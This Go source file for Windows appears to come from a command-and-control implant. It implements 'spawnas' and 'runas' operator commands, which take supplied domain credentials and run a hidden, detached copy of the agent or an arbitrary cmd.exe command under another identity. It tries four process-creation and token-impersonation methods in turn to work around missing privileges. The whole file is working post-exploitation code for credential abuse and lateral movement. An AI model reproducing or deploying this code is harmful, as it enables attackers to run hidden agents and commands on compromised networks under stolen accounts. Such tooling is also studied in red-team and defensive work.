//go:build windows

package main

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

// Windows API process creation procs (advapi32 is declared in make_token_windows.go).
var (
	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
	procCreateProcessWithLogonW = advapi32.NewProc("CreateProcessWithLogonW")
	spawnasKernel32             = syscall.NewLazyDLL("kernel32.dll")
	procCreatePipeK             = spawnasKernel32.NewProc("CreatePipe")
	procSetHandleInfo           = spawnasKernel32.NewProc("SetHandleInformation")
	procReadFileK               = spawnasKernel32.NewProc("ReadFile")
	procWaitSingleObject        = spawnasKernel32.NewProc("WaitForSingleObject")
	procCloseHandleK            = spawnasKernel32.NewProc("CloseHandle")
)

const (
	logon32LogonInteractive = 2
	logon32ProviderDefault  = 0
	logonWithProfile        = 0x00000001
	createUnicodeEnv        = 0x00000400
	detachedProcessFlag     = 0x00000008
	startfUseStdHandles     = 0x00000100
	handleFlagInherit       = 0x00000001
	waitInfinite            = 0xFFFFFFFF
	errorPrivilegeNotHeld   = syscall.Errno(1314)
	normalPriorityClassFlag = 0x00000020
)

// spawnasStartupInfoW mirrors STARTUPINFOW (104 bytes on 64-bit Windows).
// The Go alignment rules produce the correct layout:
//   - Cb (uint32, 4 bytes) + 4 bytes padding → offset 0
//   - _reserved (uintptr, 8 bytes) → offset 8
//     etc.
type spawnasStartupInfoW struct {
	Cb            uint32
	_reserved     uintptr
	Desktop       uintptr
	Title         uintptr
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	CbReserved2   uint16
	LpReserved2   uintptr
	StdInput      syscall.Handle
	StdOutput     syscall.Handle
	StdError      syscall.Handle
}

// spawnasProcessInformation mirrors PROCESS_INFORMATION.
type spawnasProcessInformation struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessId uint32
	ThreadId  uint32
}

// spawnasPayload carries a __SPAWNAS__ command's JSON body.
type spawnasPayload struct {
	SessionID   string  `json:"session_id"`
	WorkspaceID *string `json:"workspace_id,omitempty"`
	Domain      string  `json:"domain"`
	User        string  `json:"user"`
	Password    string  `json:"password"`
}

// runasPayload carries a __RUNAS__ command's JSON body.
type runasPayload struct {
	Command  string `json:"command"`
	Domain   string `json:"domain"`
	User     string `json:"user"`
	Password string `json:"password"`
}

func parseSpawnasPayload(command string) (spawnasPayload, error) {
	var payload spawnasPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	payload.Domain = strings.TrimSpace(payload.Domain)
	payload.User = strings.TrimSpace(payload.User)
	if payload.Domain == "" && strings.Contains(payload.User, `\`) {
		p := strings.SplitN(payload.User, `\`, 2)
		payload.Domain = strings.TrimSpace(p[0])
		payload.User = strings.TrimSpace(p[1])
	}
	if payload.User == "" {
		return payload, errors.New("user is required")
	}
	return payload, nil
}

func parseRunasPayload(command string) (runasPayload, error) {
	var payload runasPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	payload.Domain = strings.TrimSpace(payload.Domain)
	payload.User = strings.TrimSpace(payload.User)
	payload.Command = strings.TrimSpace(payload.Command)
	if payload.Domain == "" && strings.Contains(payload.User, `\`) {
		p := strings.SplitN(payload.User, `\`, 2)
		payload.Domain = strings.TrimSpace(p[0])
		payload.User = strings.TrimSpace(p[1])
	}
	if payload.User == "" {
		return payload, errors.New("user is required")
	}
	if payload.Command == "" {
		return payload, errors.New("command is required")
	}
	return payload, nil
}

// logonUserInteractive obtains a primary token via LOGON32_LOGON_INTERACTIVE (type 2).
// A primary token is required by CreateProcessAsUser and CreateProcessWithTokenW.
func logonUserInteractive(domain, user, password string) (syscall.Token, error) {
	userPtr, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return 0, err
	}
	domainPtr, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return 0, err
	}
	passwordPtr, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return 0, err
	}
	var token syscall.Token
	r, _, callErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		logon32LogonInteractive,
		logon32ProviderDefault,
		uintptr(unsafe.Pointer(&token)),
	)
	if r == 0 {
		return 0, fmt.Errorf("LogonUserW(INTERACTIVE) failed: %w", callErr)
	}
	return token, nil
}

// logonUserNewCreds obtains an impersonation token via LOGON32_LOGON_NEW_CREDENTIALS (type 9).
func logonUserNewCreds(domain, user, password string) (syscall.Token, error) {
	userPtr, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return 0, err
	}
	domainPtr, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return 0, err
	}
	passwordPtr, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return 0, err
	}
	var token syscall.Token
	r, _, callErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		logonNewCredentials, // 9 — declared in make_token_windows.go
		logonProviderWinNT32,
		uintptr(unsafe.Pointer(&token)),
	)
	if r == 0 {
		return 0, fmt.Errorf("LogonUserW(NEW_CREDENTIALS) failed: %w", callErr)
	}
	return token, nil
}

// buildWindowsCmdLine builds a Windows-quoted command-line string from args.
func buildWindowsCmdLine(args []string) string {
	var sb strings.Builder
	for i, arg := range args {
		if i > 0 {
			sb.WriteByte(' ')
		}
		needsQuoting := strings.ContainsAny(arg, " \t\v\"") || arg == ""
		if !needsQuoting {
			sb.WriteString(arg)
			continue
		}
		sb.WriteByte('"')
		slashes := 0
		for _, c := range arg {
			switch c {
			case '\\':
				slashes++
			case '"':
				for j := 0; j < slashes; j++ {
					sb.WriteString(`\\`)
				}
				slashes = 0
				sb.WriteString(`\"`)
			default:
				for j := 0; j < slashes; j++ {
					sb.WriteByte('\\')
				}
				slashes = 0
				sb.WriteRune(c)
			}
		}
		for j := 0; j < slashes; j++ {
			sb.WriteString(`\\`)
		}
		sb.WriteByte('"')
	}
	return sb.String()
}

// buildEnvBlock converts []string env entries into a UTF-16 double-null-terminated block.
func buildEnvBlock(env []string) []uint16 {
	env = append([]string(nil), env...)
	sort.SliceStable(env, func(i, j int) bool { return strings.ToUpper(env[i]) < strings.ToUpper(env[j]) })
	var buf []uint16
	for _, kv := range env {
		buf = append(buf, utf16.Encode([]rune(kv))...)
		buf = append(buf, 0)
	}
	buf = append(buf, 0)
	if len(buf) == 1 {
		buf = append(buf, 0)
	}
	return buf
}

// createInheritablePipe creates an anonymous pipe with the write end inheritable.
// The read end is kept non-inheritable so the parent can drain it after the child exits.
func createInheritablePipe() (readH, writeH syscall.Handle, err error) {
	sa := struct {
		nLength              uint32
		lpSecurityDescriptor uintptr
		bInheritHandle       int32
	}{nLength: 12, bInheritHandle: 1}
	r, _, callErr := procCreatePipeK.Call(
		uintptr(unsafe.Pointer(&readH)),
		uintptr(unsafe.Pointer(&writeH)),
		uintptr(unsafe.Pointer(&sa)),
		0,
	)
	if r == 0 {
		return 0, 0, fmt.Errorf("CreatePipe: %w", callErr)
	}
	procSetHandleInfo.Call(uintptr(readH), handleFlagInherit, 0)
	return readH, writeH, nil
}

// readPipeAll drains handle h until EOF.
func readPipeAll(h syscall.Handle) string {
	var buf bytes.Buffer
	tmp := make([]byte, 4096)
	for {
		var n uint32
		r, _, _ := procReadFileK.Call(
			uintptr(h), uintptr(unsafe.Pointer(&tmp[0])), uintptr(len(tmp)),
			uintptr(unsafe.Pointer(&n)), 0,
		)
		if r == 0 || n == 0 {
			break
		}
		buf.Write(tmp[:n])
	}
	return buf.String()
}

// isPrivilegeError returns true when err indicates a missing privilege.
func isPrivilegeError(err error) bool {
	if err == nil {
		return false
	}
	var sysErr syscall.Errno
	if errors.As(err, &sysErr) {
		return sysErr == errorPrivilegeNotHeld || sysErr == syscall.ERROR_ACCESS_DENIED
	}
	s := err.Error()
	return strings.Contains(s, "1314") || strings.Contains(s, "Access is denied")
}

// cascadeSpawnDetached tries all four Windows process-creation APIs in order
// and returns the PID of the first that succeeds.
//
// Order: CreateProcessAsUser → CreateProcessWithTokenW → CreateProcessWithLogonW → CreateProcessA
//
// Steps 1 and 2 require a primary token obtained via LOGON32_LOGON_INTERACTIVE
// and either SE_ASSIGNPRIMARYTOKEN_PRIVILEGE (step 1) or SE_IMPERSONATE_PRIVILEGE (step 2).
// Step 3 requires no special privileges. Step 4 applies LOGON_NEW_CREDENTIALS thread
// impersonation and runs the process under the agent's own process identity but with
// outbound network credentials set.
func cascadeSpawnDetached(user, domain, password, executable string, args []string, envStrings []string) (uint32, error) {
	execPtr, err := syscall.UTF16PtrFromString(executable)
	if err != nil {
		return 0, fmt.Errorf("encode executable: %w", err)
	}
	cmdLineStr := buildWindowsCmdLine(args)
	cmdLine, err := syscall.UTF16PtrFromString(cmdLineStr)
	if err != nil {
		return 0, fmt.Errorf("encode command line: %w", err)
	}
	envBlock := buildEnvBlock(envStrings)
	si := spawnasStartupInfoW{Cb: uint32(unsafe.Sizeof(spawnasStartupInfoW{}))}
	var pi spawnasProcessInformation
	flags := uint32(createUnicodeEnv | detachedProcessFlag | normalPriorityClassFlag)

	primaryToken, tokenErr := logonUserInteractive(domain, user, password)
	if tokenErr == nil {
		defer syscall.CloseHandle(syscall.Handle(primaryToken))

		// Step 1: exec.Cmd with SysProcAttr.Token → Go calls CreateProcessAsUserW.
		child1 := exec.Command(executable) // exec.Command, not newCommand — detached lifetime
		child1.Env = envStrings
		child1.Stdin = nil
		child1.Stdout = nil
		child1.Stderr = nil
		detachSpawnCommand(child1)              // Sets HideWindow=true, CreationFlags=CREATE_NEW_PROCESS_GROUP|DETACHED_PROCESS
		child1.SysProcAttr.Token = primaryToken // Add Token without losing the other flags
		if startErr := child1.Start(); startErr == nil {
			pid := uint32(child1.Process.Pid)
			go func() { _ = child1.Wait() }()
			return pid, nil
		} else if !isPrivilegeError(startErr) {
			return 0, fmt.Errorf("CreateProcessAsUser: %w", startErr)
		}
		logf("spawnas: CreateProcessAsUser requires privilege; trying CreateProcessWithTokenW")

		// Step 2: direct CreateProcessWithTokenW.
		pi = spawnasProcessInformation{}
		r2, _, ce2 := procCreateProcessWithTokenW.Call(
			uintptr(primaryToken), logonWithProfile,
			uintptr(unsafe.Pointer(execPtr)),
			uintptr(unsafe.Pointer(cmdLine)),
			uintptr(flags),
			uintptr(unsafe.Pointer(&envBlock[0])),
			0,
			uintptr(unsafe.Pointer(&si)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if r2 != 0 {
			pid := pi.ProcessId
			syscall.CloseHandle(pi.Process)
			syscall.CloseHandle(pi.Thread)
			return pid, nil
		}
		if !isPrivilegeError(ce2) {
			return 0, fmt.Errorf("CreateProcessWithTokenW: %w", ce2)
		}
		logf("spawnas: CreateProcessWithTokenW requires privilege; trying CreateProcessWithLogonW")
	}

	// Step 3: CreateProcessWithLogonW (no special privileges needed).
	userPtr, _ := syscall.UTF16PtrFromString(user)
	domainPtr, _ := syscall.UTF16PtrFromString(domain)
	passwordPtr, _ := syscall.UTF16PtrFromString(password)
	pi = spawnasProcessInformation{}
	r3, _, ce3 := procCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		logonWithProfile,
		uintptr(unsafe.Pointer(execPtr)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(flags),
		uintptr(unsafe.Pointer(&envBlock[0])),
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r3 != 0 {
		pid := pi.ProcessId
		syscall.CloseHandle(pi.Process)
		syscall.CloseHandle(pi.Thread)
		return pid, nil
	}
	logf("spawnas: CreateProcessWithLogonW failed (%v); trying thread impersonation + CreateProcess", ce3)

	// Step 4: ImpersonateLoggedOnUser(LOGON_NEW_CREDENTIALS) + plain CreateProcess.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	impToken, impErr := logonUserNewCreds(domain, user, password)
	if impErr != nil {
		return 0, fmt.Errorf("all process creation methods failed; last error: %w", ce3)
	}
	defer syscall.CloseHandle(syscall.Handle(impToken))
	if r4, _, iErr := procImpersonateLoggedOnUser.Call(uintptr(impToken)); r4 == 0 {
		return 0, fmt.Errorf("ImpersonateLoggedOnUser for step 4: %w", iErr)
	}
	defer procRevertToSelf.Call()

	child4 := exec.Command(executable)
	child4.Env = envStrings
	child4.Stdin = nil
	child4.Stdout = nil
	child4.Stderr = nil
	child4.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: detachedProcessFlag,
	}
	detachSpawnCommand(child4)
	if startErr := child4.Start(); startErr != nil {
		return 0, fmt.Errorf("CreateProcess (step 4): %w", startErr)
	}
	pid := uint32(child4.Process.Pid)
	go func() { _ = child4.Wait() }()
	return pid, nil
}

// cascadeRunWithOutput runs a command under the given identity and captures
// its combined output using the same four-method cascade as cascadeSpawnDetached.
func cascadeRunWithOutput(ctx context.Context, user, domain, password string, shellArgs []string, envStrings []string) (string, error) {
	envBlock := buildEnvBlock(envStrings)

	// Step 1: exec.Cmd with SysProcAttr.Token.
	primaryToken, tokenErr := logonUserInteractive(domain, user, password)
	if tokenErr == nil {
		defer syscall.CloseHandle(syscall.Handle(primaryToken))

		child1 := newBoundedCommand(ctx, shellArgs[0], shellArgs[1:]...)
		child1.SysProcAttr = &syscall.SysProcAttr{
			Token:      primaryToken,
			HideWindow: true,
		}
		var buf1 bytes.Buffer
		child1.Stdout = &buf1
		child1.Stderr = &buf1
		if runErr := child1.Run(); runErr == nil || !isPrivilegeError(runErr) {
			return strings.TrimSpace(buf1.String()), runErr
		}
		logf("runas: CreateProcessAsUser requires privilege; trying CreateProcessWithTokenW")

		// Step 2: CreateProcessWithTokenW with pipes.
		if out, err := runWithPipesTokenW(primaryToken, shellArgs, envBlock); err == nil || !isPrivilegeError(err) {
			return strings.TrimSpace(out), err
		}
		logf("runas: CreateProcessWithTokenW requires privilege; trying CreateProcessWithLogonW")
	}

	// Step 3: CreateProcessWithLogonW with pipes.
	out3, err3 := runWithPipesLogonW(user, domain, password, shellArgs, envBlock)
	if err3 == nil || !isPrivilegeError(err3) {
		return strings.TrimSpace(out3), err3
	}
	logf("runas: CreateProcessWithLogonW failed (%v); trying thread impersonation", err3)

	// Step 4: ImpersonateLoggedOnUser(LOGON_NEW_CREDENTIALS) + exec.Cmd.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	impToken, impErr := logonUserNewCreds(domain, user, password)
	if impErr != nil {
		return "", fmt.Errorf("all runas methods failed; last: %w", err3)
	}
	defer syscall.CloseHandle(syscall.Handle(impToken))
	if r, _, iErr := procImpersonateLoggedOnUser.Call(uintptr(impToken)); r == 0 {
		return "", fmt.Errorf("ImpersonateLoggedOnUser for step 4: %w", iErr)
	}
	defer procRevertToSelf.Call()

	child4 := newBoundedCommand(ctx, shellArgs[0], shellArgs[1:]...)
	child4.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	var buf4 bytes.Buffer
	child4.Stdout = &buf4
	child4.Stderr = &buf4
	_ = child4.Run()
	return strings.TrimSpace(buf4.String()), nil
}

// runWithPipesTokenW calls CreateProcessWithTokenW with stdout/stderr redirected to pipes.
func runWithPipesTokenW(token syscall.Token, args []string, envBlock []uint16) (string, error) {
	readH, writeH, err := createInheritablePipe()
	if err != nil {
		return "", err
	}
	defer procCloseHandleK.Call(uintptr(readH))

	si := spawnasStartupInfoW{
		Cb:        uint32(unsafe.Sizeof(spawnasStartupInfoW{})),
		Flags:     startfUseStdHandles,
		StdOutput: writeH,
		StdError:  writeH,
	}
	var pi spawnasProcessInformation
	execPtr, _ := syscall.UTF16PtrFromString(args[0])
	cmdLine, _ := syscall.UTF16PtrFromString(buildWindowsCmdLine(args))
	flags := uint32(createUnicodeEnv | normalPriorityClassFlag)

	r, _, callErr := procCreateProcessWithTokenW.Call(
		uintptr(token), logonWithProfile,
		uintptr(unsafe.Pointer(execPtr)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(flags),
		uintptr(unsafe.Pointer(&envBlock[0])),
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	procCloseHandleK.Call(uintptr(writeH))
	if r == 0 {
		return "", callErr
	}
	out := readPipeAll(readH)
	procWaitSingleObject.Call(uintptr(pi.Process), waitInfinite)
	procCloseHandleK.Call(uintptr(pi.Process))
	procCloseHandleK.Call(uintptr(pi.Thread))
	return out, nil
}

// runWithPipesLogonW calls CreateProcessWithLogonW with stdout/stderr redirected to pipes.
func runWithPipesLogonW(user, domain, password string, args []string, envBlock []uint16) (string, error) {
	readH, writeH, err := createInheritablePipe()
	if err != nil {
		return "", err
	}
	defer procCloseHandleK.Call(uintptr(readH))

	si := spawnasStartupInfoW{
		Cb:        uint32(unsafe.Sizeof(spawnasStartupInfoW{})),
		Flags:     startfUseStdHandles,
		StdOutput: writeH,
		StdError:  writeH,
	}
	var pi spawnasProcessInformation
	userPtr, _ := syscall.UTF16PtrFromString(user)
	domainPtr, _ := syscall.UTF16PtrFromString(domain)
	passwordPtr, _ := syscall.UTF16PtrFromString(password)
	execPtr, _ := syscall.UTF16PtrFromString(args[0])
	cmdLine, _ := syscall.UTF16PtrFromString(buildWindowsCmdLine(args))
	flags := uint32(createUnicodeEnv | normalPriorityClassFlag)

	r, _, callErr := procCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		logonWithProfile,
		uintptr(unsafe.Pointer(execPtr)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(flags),
		uintptr(unsafe.Pointer(&envBlock[0])),
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	procCloseHandleK.Call(uintptr(writeH))
	if r == 0 {
		return "", callErr
	}
	out := readPipeAll(readH)
	procWaitSingleObject.Call(uintptr(pi.Process), waitInfinite)
	procCloseHandleK.Call(uintptr(pi.Process))
	procCloseHandleK.Call(uintptr(pi.Thread))
	return out, nil
}

// identityLabel builds a DOMAIN\user label (or just user if no domain).
func identityLabel(domain, user string) string {
	if domain != "" {
		return domain + `\` + user
	}
	return user
}

// spawnasCommand handles __SPAWNAS__: spawn a new agent copy under a different
// process identity using the four-method cascade.
func spawnasCommand(command string, cfg *config) (string, error) {
	payload, err := parseSpawnasPayload(command)
	if err != nil {
		return "", err
	}
	childConfig := *cfg
	sessionID := payload.SessionID
	if sessionID == "" {
		sessionID = derivedSessionID(cfg.SessionID, "spawnas")
	} else if !agentSessionIDPattern.MatchString(sessionID) || sessionID == cfg.SessionID {
		return "", errors.New("spawnas requires a fresh token-safe session ID")
	}
	if payload.WorkspaceID != nil {
		if *payload.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(*payload.WorkspaceID) {
			return "", errors.New("invalid spawnas workspace ID")
		}
		childConfig.WorkspaceID = *payload.WorkspaceID
	}

	executable, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("resolve agent executable: %w", err)
	}
	envStrings := spawnEnvironment(&childConfig, sessionID)
	args := []string{executable}

	pid, err := cascadeSpawnDetached(payload.User, payload.Domain, payload.Password, executable, args, envStrings)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("spawned session=%s pid=%d identity=%s",
		sessionID, pid, identityLabel(payload.Domain, payload.User)), nil
}

// runasCommand handles __RUNAS__: run a shell command under a different identity
// and return its output using the four-method cascade.
func runasCommand(command string) (string, error) {
	payload, err := parseRunasPayload(command)
	if err != nil {
		return "", err
	}
	shellArgs := []string{`C:\Windows\System32\cmd.exe`, "/c", payload.Command}

	ctx, cancel := context.WithTimeout(agentContext, 120*time.Second)
	defer cancel()

	out, err := cascadeRunWithOutput(ctx, payload.User, payload.Domain, payload.Password,
		shellArgs, os.Environ())
	if err != nil {
		return fmt.Sprintf("runas error: %v\noutput: %s", err, out), nil
	}
	return out, nil
}

// startDetachedAgent uses the active netonly token, then progressively falls
// back to APIs with fewer privilege requirements. It never logs credentials.
func startDetachedAgent(command *exec.Cmd) (int, string, bool, error) {
	tokenMu.Lock()
	token, active, credentials := activeToken, tokenActive, spawnCredentials
	tokenMu.Unlock()
	active = active && token != 0
	if active {
		defer reestablishThreadToken()
	}
	executable, err := syscall.UTF16PtrFromString(command.Path)
	if err != nil {
		return 0, "", false, err
	}
	line := buildWindowsCmdLine(command.Args)
	for _, entry := range command.Env {
		if strings.ContainsRune(entry, 0) {
			return 0, "", false, errors.New("invalid spawn environment")
		}
	}
	env := buildEnvBlock(command.Env)
	flags := uint32(createUnicodeEnv | detachedProcessFlag | syscall.CREATE_NEW_PROCESS_GROUP)
	// Each API receives a fresh mutable command line and process information.
	startWide := func(withToken bool) (int, error) {
		cmdLine, encodeErr := syscall.UTF16PtrFromString(line)
		if encodeErr != nil {
			return 0, encodeErr
		}
		si := spawnasStartupInfoW{Cb: uint32(unsafe.Sizeof(spawnasStartupInfoW{})), Flags: 1}
		var pi spawnasProcessInformation
		var ok uintptr
		var callErr error
		if withToken {
			ok, _, callErr = procCreateProcessWithTokenW.Call(uintptr(token), 0,
				uintptr(unsafe.Pointer(executable)), uintptr(unsafe.Pointer(cmdLine)), uintptr(flags),
				uintptr(unsafe.Pointer(&env[0])), 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
		} else {
			if credentials.user == "" {
				return 0, errors.New("active logon credentials unavailable")
			}
			user, _ := syscall.UTF16PtrFromString(credentials.user)
			domain, _ := syscall.UTF16PtrFromString(credentials.domain)
			password, _ := syscall.UTF16PtrFromString(credentials.password)
			// LOGON_NETCREDENTIALS_ONLY preserves make_token's network-only semantics.
			ok, _, callErr = procCreateProcessWithLogonW.Call(uintptr(unsafe.Pointer(user)),
				uintptr(unsafe.Pointer(domain)), uintptr(unsafe.Pointer(password)), 2,
				uintptr(unsafe.Pointer(executable)), uintptr(unsafe.Pointer(cmdLine)), uintptr(flags),
				uintptr(unsafe.Pointer(&env[0])), 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
		}
		if ok == 0 {
			return 0, callErr
		}
		_ = syscall.CloseHandle(pi.Thread)
		_ = syscall.CloseHandle(pi.Process)
		return int(pi.ProcessId), nil
	}
	methods := spawnMethods{}
	if active {
		methods.asUser = func() (int, error) {
			command.SysProcAttr.Token = token
			if startErr := command.Start(); startErr != nil {
				return 0, startErr
			}
			pid := command.Process.Pid
			go func() { _ = command.Wait() }()
			return pid, nil
		}
		methods.withToken = func() (int, error) { return startWide(true) }
		methods.withLogon = func() (int, error) { return startWide(false) }
	}
	methods.original = func() (int, error) {
		app, encodeErr := spawnANSI(command.Path)
		if encodeErr != nil {
			return 0, encodeErr
		}
		cmdLine, encodeErr := spawnANSI(line)
		if encodeErr != nil {
			return 0, encodeErr
		}
		si := spawnasStartupInfoW{Cb: uint32(unsafe.Sizeof(spawnasStartupInfoW{})), Flags: 1}
		var pi spawnasProcessInformation
		ok, _, callErr := spawnasKernel32.NewProc("CreateProcessA").Call(
			uintptr(unsafe.Pointer(&app[0])), uintptr(unsafe.Pointer(&cmdLine[0])), 0, 0, 0,
			uintptr(flags), uintptr(unsafe.Pointer(&env[0])), 0,
			uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
		if ok == 0 {
			return 0, callErr
		}
		_ = syscall.CloseHandle(pi.Thread)
		_ = syscall.CloseHandle(pi.Process)
		return int(pi.ProcessId), nil
	}
	return dispatchSpawn(active, methods)
}

// spawnANSI converts paths and arguments to the system ANSI code page without
// silently substituting characters. The CreateProcessA fallback uses this encoding.
func spawnANSI(value string) ([]byte, error) {
	page, _, _ := spawnasKernel32.NewProc("GetACP").Call()
	if page == 65001 {
		return syscall.ByteSliceFromString(value)
	}
	wide, err := syscall.UTF16FromString(value)
	if err != nil {
		return nil, err
	}
	convert := spawnasKernel32.NewProc("WideCharToMultiByte")
	var substituted int32
	size, _, callErr := convert.Call(0, 0x400, uintptr(unsafe.Pointer(&wide[0])), uintptr(len(wide)),
		0, 0, 0, uintptr(unsafe.Pointer(&substituted)))
	if size == 0 {
		return nil, callErr
	}
	buffer := make([]byte, int(size))
	written, _, callErr := convert.Call(0, 0x400, uintptr(unsafe.Pointer(&wide[0])), uintptr(len(wide)),
		uintptr(unsafe.Pointer(&buffer[0])), size, 0, uintptr(unsafe.Pointer(&substituted)))
	if written == 0 {
		return nil, callErr
	}
	if substituted != 0 {
		return nil, errors.New("executable path cannot be represented by CreateProcessA")
	}
	return buffer, nil
}
